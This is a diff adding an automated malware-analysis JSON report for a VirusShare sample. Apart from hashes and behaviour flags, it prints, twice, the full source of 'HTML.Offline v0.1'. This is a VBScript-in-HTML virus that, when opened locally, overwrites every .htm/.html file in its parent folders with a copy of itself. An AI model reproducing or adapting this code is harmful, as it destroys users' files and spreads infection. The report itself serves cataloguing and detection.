@@ -1,0 +1,78 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "Call": "May call a DLL using Excel 4 Macros",
+            "CopyFile": "May copy a file",
+            "CreateObject": "May create an OLE object"
+        },
+        "macro": "<html>\n\n<head>\n<meta http-equiv=\"Content-Type\"\ncontent=\"text/html; charset=iso-8859-1\">\n<meta name=\"Author\" content=\"1nternal\">\n<title></title>\n</head>\n\n<body onload=\"CheckIt();\">\n\n<p>&nbsp;</p>\n\n<p align=\"center\"><strong>HTML.Offline v0.1</strong></p>\n\n<p align=\"center\"><a\nhref=\"http://www.geocities.com/SiliconValley/Horizon/9386\">1nternal's\nVX Site</a></p>\n\n<p align=\"center\"><script language=\"VBScript\"><!--\nSub CheckIt\n\tIf location.protocol = \"file:\" then Call IsFile\nEnd Sub\n\nSub IsFile\n\tDim FSO,folder ,fc, f1, cpath\n\tSet FSO = CreateObject(\"Scripting.FileSystemObject\")\n\tHostPath = Replace(location.href, \"file:///\", \"\")\n\tHostPath = Replace(HostPath, \"/\", \"\\\")\n\tcpath = fso.GetParentFolderName(HostPath)\n\tSet folder = fso.GetFolder(cpath)\n\n\tWhile folder.IsRootFolder = false \n\t\tSet folder = fso.GetFolder(cpath)\n\t\tSet fc = folder.Files\n\t\tcpath = fso.GetParentFolderName(cpath)\n\t\tFor each f1 in fc\n\t\t\ts = Fso.GetExtensionName(f1.name)\n\t\t\tIf f1.path <> HostPath then\n\t\t\t\tIf s = \"htm\" or s = \"html\" then fso.CopyFile HostPath, f1.path\n\t\t\tEnd If\n\t\tNext\n\tWend\nEnd Sub\n--></script></p>\n</body>\n</html>"
+    },
+    "filename": "VirusShare_486284672fb205c40df7da42278b3a4a",
+    "filesize": 1152,
+    "filetype": "HTML document, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "486284672fb205c40df7da42278b3a4a",
+        "sha1": "f4fd77aa7b01172883594a451b1a9e6df3cf521b",
+        "sha256": "002209c063a71cf08e4e11de8b54633347bfe057533b5710a3c47ba6a8c60147"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "<html>",
+            "<head>",
+            "<meta http-equiv=\"Content-Type\"",
+            "content=\"text/html; charset=iso-8859-1\">",
+            "<meta name=\"Author\" content=\"1nternal\">",
+            "<title></title>",
+            "</head>",
+            "<body onload=\"CheckIt();\">",
+            "<p>&nbsp;</p>",
+            "<p align=\"center\"><strong>HTML.Offline v0.1</strong></p>",
+            "<p align=\"center\"><a",
+            "href=\"http://www.geocities.com/SiliconValley/Horizon/9386\">1nternal's",
+            "VX Site</a></p>",
+            "<p align=\"center\"><script language=\"VBScript\"><!--",
+            "Sub CheckIt",
+            "\tIf location.protocol = \"file:\" then Call IsFile",
+            "End Sub",
+            "Sub IsFile",
+            "\tDim FSO,folder ,fc, f1, cpath",
+            "\tSet FSO = CreateObject(\"Scripting.FileSystemObject\")",
+            "\tHostPath = Replace(location.href, \"file:///\", \"\")",
+            "\tHostPath = Replace(HostPath, \"/\", \"\\\")",
+            "\tcpath = fso.GetParentFolderName(HostPath)",
+            "\tSet folder = fso.GetFolder(cpath)",
+            "\tWhile folder.IsRootFolder = false ",
+            "\t\tSet folder = fso.GetFolder(cpath)",
+            "\t\tSet fc = folder.Files",
+            "\t\tcpath = fso.GetParentFolderName(cpath)",
+            "\t\tFor each f1 in fc",
+            "\t\t\ts = Fso.GetExtensionName(f1.name)",
+            "\t\t\tIf f1.path <> HostPath then",
+            "\t\t\t\tIf s = \"htm\" or s = \"html\" then fso.CopyFile HostPath, f1.path",
+            "\t\t\tEnd If",
+            "\t\tNext",
+            "\tWend",
+            "End Sub",
+            "--></script></p>",
+            "</body>",
+            "</html>"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": [
+            "http://www.geocities.com/SiliconValley/Horizon/9386",
+            "file:///"
+        ]
+    },
+    "time": "0:00:00.275590",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
